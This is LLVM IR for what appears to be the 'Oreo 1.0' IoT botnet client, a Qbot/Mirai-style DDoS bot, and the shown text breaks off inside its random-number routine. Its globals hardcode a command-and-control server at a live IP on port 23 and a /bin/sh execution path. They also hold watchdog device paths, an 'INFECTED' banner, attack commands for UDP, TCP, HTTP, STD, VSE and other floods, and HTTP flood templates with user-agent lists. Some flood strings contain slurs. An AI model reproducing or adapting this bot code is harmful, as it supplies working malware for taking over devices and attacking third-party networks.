; ModuleID = 'host/ir_O1/Oreo.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.timeval = type { i64, i64 }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.0 }
%union.anon.0 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.ifreq = type { %union.anon.5, %union.anon.6 }
%union.anon.5 = type { [16 x i8] }
%union.anon.6 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }

@OreoServer = local_unnamed_addr global [1 x i8*] [i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str, i32 0, i32 0)], align 8
@.str = private unnamed_addr constant [18 x i8] c"128.199.197.79:23\00", align 1
@ioctl_pid = local_unnamed_addr global i32 0, align 4
@mainCommSock = local_unnamed_addr global i32 0, align 4
@currentServer = local_unnamed_addr global i32 -1, align 4
@gotIP = local_unnamed_addr global i32 0, align 4
@rangechoice = local_unnamed_addr global i32 1, align 4
@numpids = local_unnamed_addr global i64 0, align 8
@macAddress = local_unnamed_addr global [6 x i8] zeroinitializer, align 1
@pids = common local_unnamed_addr global i32* null, align 8
@ourIP = common local_unnamed_addr global %struct.in_addr zeroinitializer, align 4
@useragents = local_unnamed_addr global [32 x i8*] [i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([136 x i8], [136 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([165 x i8], [165 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([164 x i8], [164 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([152 x i8], [152 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([182 x i8], [182 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.73, i32 0, i32 0)], align 16
@.str.42 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36\00", align 1
@.str.43 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36\00", align 1
@.str.44 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Safari/604.1.38\00", align 1
@.str.45 = private unnamed_addr constant [136 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53\00", align 1
@.str.46 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0\00", align 1
@.str.47 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (X11; CrOS x86_64 9592.96.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.114 Safari/537.36\00", align 1
@.str.48 = private unnamed_addr constant [165 x i8] c"Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G930W8 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.4 Chrome/51.0.2704.106 Mobile Safari/537.36\00", align 1
@.str.49 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\00", align 1
@.str.50 = private unnamed_addr constant [164 x i8] c"Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; Lumia 535) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Mobile Safari/537.36 Edge/14.14393\00", align 1
@.str.51 = private unnamed_addr constant [152 x i8] c"Mozilla/5.0 (Linux; Android 4.4.4; HTC Desire 620 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36\00", align 1
@.str.52 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27\00", align 1
@.str.53 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\00", align 1
@.str.54 = private unnamed_addr constant [157 x i8] c"Mozilla/5.0 (Linux; Android 5.0; HUAWEI GRA-L09 Build/HUAWEIGRA-L09) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36\00", align 1
@.str.55 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\00", align 1
@.str.56 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36\00", align 1
@.str.57 = private unnamed_addr constant [157 x i8] c"Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc\00", align 1
@.str.58 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk\00", align 1
@.str.59 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41\00", align 1
@.str.60 = private unnamed_addr constant [63 x i8] c"Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)\00", align 1
@.str.61 = private unnamed_addr constant [182 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00", align 1
@.str.62 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1\00", align 1
@.str.63 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)\00", align 1
@.str.64 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4\00", align 1
@.str.65 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00", align 1
@.str.66 = private unnamed_addr constant [69 x i8] c"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911\00", align 1
@.str.67 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2\00", align 1
@.str.68 = private unnamed_addr constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)\00", align 1
@.str.69 = private unnamed_addr constant [87 x i8] c"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\00", align 1
@.str.70 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00", align 1
@.str.71 = private unnamed_addr constant [34 x i8] c"Mozilla/5.0 (PLAYSTATION 3; 3.55)\00", align 1
@.str.72 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2\00", align 1
@.str.73 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5\00", align 1
@scanPid = common local_unnamed_addr global i32 0, align 4
@ourPublicIP = common local_unnamed_addr global %struct.in_addr zeroinitializer, align 4
@Q = internal unnamed_addr global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal unnamed_addr global i32 4095, align 4
@c = internal unnamed_addr global i32 362436, align 4
@.str.117 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@fdopen_pids = internal unnamed_addr global i32* null, align 8
@.str.1 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.3 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@hextable = internal unnamed_addr constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1], align 16
@.str.4 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@sendSTD.randstrings = private unnamed_addr constant [36 x i8*] [i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.41, i32 0, i32 0)], align 16
@.str.6 = private unnamed_addr constant [16 x i8] c"VSzNC0CJti3ouku\00", align 1
@.str.7 = private unnamed_addr constant [16 x i8] c"yhJyMAqx7DZa0kg\00", align 1
@.str.8 = private unnamed_addr constant [16 x i8] c"1Cp9MEDMN6B5L1K\00", align 1
@.str.9 = private unnamed_addr constant [11 x i8] c"miraiMIRAI\00", align 1
@.str.10 = private unnamed_addr constant [10 x i8] c"stdflood4\00", align 1
@.str.11 = private unnamed_addr constant [11 x i8] c"7XLPHoxkvL\00", align 1
@.str.12 = private unnamed_addr constant [11 x i8] c"jmQvYBdRZA\00", align 1
@.str.13 = private unnamed_addr constant [11 x i8] c"eNxERkyrfR\00", align 1
@.str.14 = private unnamed_addr constant [11 x i8] c"qHjTXcMbzH\00", align 1
@.str.15 = private unnamed_addr constant [15 x i8] c"chickennuggets\00", align 1
@.str.16 = private unnamed_addr constant [13 x i8] c"ilovecocaine\00", align 1
@.str.17 = private unnamed_addr constant [7 x i8] c"666666\00", align 1
@.str.18 = private unnamed_addr constant [9 x i8] c"88888888\00", align 1
@.str.19 = private unnamed_addr constant [11 x i8] c"0nnf0l20im\00", align 1
@.str.20 = private unnamed_addr constant [11 x i8] c"uq7ajzgm0a\00", align 1
@.str.21 = private unnamed_addr constant [5 x i8] c"loic\00", align 1
@.str.22 = private unnamed_addr constant [19 x i8] c"ParasJhaIsADumbFag\00", align 1
@.str.23 = private unnamed_addr constant [17 x i8] c"stdudpbasedflood\00", align 1
@.str.24 = private unnamed_addr constant [9 x i8] c"bitcoin1\00", align 1
@.str.25 = private unnamed_addr constant [9 x i8] c"password\00", align 1
@.str.26 = private unnamed_addr constant [10 x i8] c"encrypted\00", align 1
@.str.27 = private unnamed_addr constant [11 x i8] c"suckmydick\00", align 1
@.str.28 = private unnamed_addr constant [13 x i8] c"guardiacivil\00", align 1
@.str.29 = private unnamed_addr constant [13 x i8] c"2xoJTsbXunuj\00", align 1
@.str.30 = private unnamed_addr constant [13 x i8] c"QiMH8CGJyOj9\00", align 1
@.str.31 = private unnamed_addr constant [9 x i8] c"abcd1234\00", align 1
@.str.32 = private unnamed_addr constant [13 x i8] c"GLEQWXHAJPWM\00", align 1
@.str.33 = private unnamed_addr constant [10 x i8] c"ABCDEFGHI\00", align 1
@.str.34 = private unnamed_addr constant [10 x i8] c"abcdefghi\00", align 1
@.str.35 = private unnamed_addr constant [11 x i8] c"qbotbotnet\00", align 1
@.str.36 = private unnamed_addr constant [12 x i8] c"lizardsquad\00", align 1
@.str.37 = private unnamed_addr constant [10 x i8] c"aNrjBnTRi\00", align 1
@.str.38 = private unnamed_addr constant [10 x i8] c"1QD8ypG86\00", align 1
@.str.39 = private unnamed_addr constant [10 x i8] c"IVkLWYjLe\00", align 1
@.str.40 = private unnamed_addr constant [20 x i8] c"nexuszetaisamaddict\00", align 1
@.str.41 = private unnamed_addr constant [15 x i8] c"satoriskidsnet\00", align 1
@sendHTTP.methods = private unnamed_addr constant [3 x i8*] [i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.75, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.76, i32 0, i32 0)], align 16
@sendHTTP.connections = private unnamed_addr constant [3 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.79, i32 0, i32 0)], align 16
@.str.80 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.81 = private unnamed_addr constant [20 x i8] c" / HTTP/1.1\0D\0AHost: \00", align 1
@.str.82 = private unnamed_addr constant [15 x i8] c"\0D\0AUser-Agent: \00", align 1
@.str.83 = private unnamed_addr constant [15 x i8] c"\0D\0AConnection: \00", align 1
@.str.84 = private unnamed_addr constant [5 x i8] c"\0D\0A\0D\0A\00", align 1
@.str.77 = private unnamed_addr constant [6 x i8] c"close\00", align 1
@.str.78 = private unnamed_addr constant [11 x i8] c"keep-alive\00", align 1
@.str.79 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@.str.74 = private unnamed_addr constant [4 x i8] c"GET\00", align 1
@.str.75 = private unnamed_addr constant [5 x i8] c"HEAD\00", align 1
@.str.76 = private unnamed_addr constant [5 x i8] c"POST\00", align 1
@.str.85 = private unnamed_addr constant [265 x i8] c"\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\00", align 1
@.str.86 = private unnamed_addr constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00", align 1
@.str.87 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
@.str.88 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.89 = private unnamed_addr constant [4 x i8] c"ALL\00", align 1
@.str.90 = private unnamed_addr constant [2 x i8] c"-\00", align 1
@.str.91 = private unnamed_addr constant [4 x i8] c"SYN\00", align 1
@.str.92 = private unnamed_addr constant [4 x i8] c"RST\00", align 1
@.str.93 = private unnamed_addr constant [4 x i8] c"FIN\00", align 1
@.str.94 = private unnamed_addr constant [4 x i8] c"ACK\00", align 1
@.str.95 = private unnamed_addr constant [4 x i8] c"PSH\00", align 1
@.str.96 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@.str.97 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.98 = private unnamed_addr constant [14 x i8] c"/dev/watchdog\00", align 1
@.str.99 = private unnamed_addr constant [19 x i8] c"/dev/misc/watchdog\00", align 1
@.str.100 = private unnamed_addr constant [23 x i8] c"/dev/FTWDT101_watchdog\00", align 1
@.str.101 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.102 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.103 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.104 = private unnamed_addr constant [8 x i8] c"HTTPHEX\00", align 1
@.str.105 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.106 = private unnamed_addr constant [5 x i8] c"FLUX\00", align 1
@.str.107 = private unnamed_addr constant [4 x i8] c"VSE\00", align 1
@.str.108 = private unnamed_addr constant [5 x i8] c"STOP\00", align 1
@.str.109 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.110 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.111 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.112 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.113 = private unnamed_addr constant [85 x i8] c"\1B[0;31m\1B[43mINFECTED\1B[40m\1B[0m \1B[0;31m----\1B[0;33m>    \1B[0;31m[\1B[0;33m%s\1B[0;31m]  \1B[0m\00", align 1
@.str.114 = private unnamed_addr constant [9 x i8] c"Oreo 1.0\00", align 1
@.str.115 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.116 = private unnamed_addr constant [2 x i8] c" \00", align 1

; Function Attrs: noinline norecurse nounwind uwtable
define void @init_rand(i32) local_unnamed_addr #0 {
  store i32 %0, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %2 = add i32 %0, -1640531527
  store i32 %2, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %3 = add i32 %0, 1013904242
  store i32 %3, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  br label %4

; <label>:4:                                      ; preds = %17, %1
  %indvars.iv = phi i64 [ 3, %1 ], [ %indvars.iv.next.1, %17 ]
  %5 = add nsw i64 %indvars.iv, -3
  %6 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %5
  %7 = load i32, i32* %6, align 4
  %8 = add nsw i64 %indvars.iv, -2
  %9 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %8
  %10 = load i32, i32* %9, align 4
  %11 = trunc i64 %indvars.iv to i32
  %12 = xor i32 %11, -1640531527
  %13 = xor i32 %12, %7
  %14 = xor i32 %13, %10
  %15 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %indvars.iv
  store i32 %14, i32* %15, align 4
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, 4096
  br i1 %exitcond, label %16, label %17

; <label>:16:                                     ; preds = %4
  ret void

; <label>:17:                                     ; preds = %4
  %18 = add nsw i64 %indvars.iv, -2
  %19 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %18
  %20 = load i32, i32* %19, align 4
  %21 = add nsw i64 %indvars.iv, -1
  %22 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %21
  %23 = load i32, i32* %22, align 4
  %24 = trunc i64 %indvars.iv.next to i32
  %25 = xor i32 %24, -1640531527
  %26 = xor i32 %25, %20
  %27 = xor i32 %26, %23
  %28 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %indvars.iv.next
  store i32 %27, i32* %28, align 4
  %indvars.iv.next.1 = add nsw i64 %indvars.iv, 2
  br label %4
}

; Function Attrs: noinline norecurse nounwind uwtable
define i32 @rand_cmwc() local_unnamed_addr #0 {
  %1 = load i32, i32* @rand_cmwc.i, align 4
  %2 = add i32 %1, 1
  %3 = and i32 %2, 4095
  store i32 %3, i32* @rand_cmwc.i, align 4
  %4 = zext i32 %3 to i64
  %5 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %4
  %6 = load i32, i32* %5, align 4
  %7 = zext i32 %6 to i64
  %8 = mul nuw nsw i64 %7, 18782
  %9 = load i32, i32* @c, align 4
  %10 = zext i32 %9 to i64
  %11 = add nuw nsw i64 %8, %10
  %12 = lshr i64 %11, 32
  %13 = trunc i64 %12 to i32
  %14 = add nuw nsw i64 %12, %11
  %15 = trunc i64 %14 to i32
  %16 = icmp ult i32 %15, %13
  %17 = zext i1 %16 to i32
  %storemerge = add nuw nsw i32 %17, %13
  store i32 %storemerge, i32* @c, align 4
